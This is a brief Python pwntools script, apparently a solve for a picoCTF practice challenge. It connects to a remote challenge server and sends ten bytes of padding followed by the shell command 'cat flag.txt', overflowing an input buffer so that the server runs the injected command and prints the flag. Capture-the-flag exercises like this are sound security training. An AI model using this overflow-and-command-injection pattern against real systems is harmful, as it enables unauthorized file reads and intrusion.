from pwn import *

# r = process('./vuln')
HOST, PORT = 'amiable-citadel.picoctf.net 59895'.split()

r = remote(HOST, PORT)
r.recvuntil(b'?\n')
r.sendline(b'A' * 10 + b'cat flag.txt')
flag = r.recvline().decode()
print(flag)

r.interactive()